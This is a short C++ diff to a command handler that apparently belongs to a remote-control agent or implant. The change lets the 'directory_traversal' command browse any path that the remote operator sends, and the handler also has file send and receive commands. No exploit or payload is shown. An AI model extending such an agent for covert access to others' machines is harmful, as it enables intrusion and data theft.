@@ -11,6 +11,7 @@
 #include <tlhelp32.h>
 #include <json/json.h> 
 
+#include "../../Generic/generic_funcs.hpp"
 #include "directory_traversal.hpp"
 #include "images.hpp"
 #include "../../Generic/logging.hpp"   
@@ -175,7 +176,7 @@ std::string command_handler(const std::string& command, const std::string& comma
     } else if (command == "send_file") {
     } else if (command == "directory_traversal") {
         Json::Value result;
-        getDirectoryContents("C:\\", result);
+        getDirectoryContents(command_data, result);
         std::string output = result.toStyledString();
         return output;
     } else if (command == "recv_file") {
